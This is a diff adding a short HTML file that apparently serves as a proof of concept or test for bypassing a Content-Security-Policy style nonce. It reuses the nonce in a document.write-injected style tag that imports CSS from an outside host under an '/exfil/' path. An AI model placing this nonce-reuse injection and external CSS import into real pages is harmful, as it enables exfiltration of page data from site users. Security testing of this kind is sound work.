@@ -1,0 +1,15 @@
+<html>
+<head>
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; style-src 'nonce-e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855'; img-src data: http: https:; font-src data: http https">
+    <style nonce="e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855">
+        /* Safe styles */
+    </style>
+</head>
+<body>
+    <script>
+        // Inject style from URL
+        var cssParam = '@import url(https://l4t.cc/exfil/a.css)';
+        document.write('<style nonce="e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855">' + cssParam + '</style>');
+    </script>
+</body>
+</html>
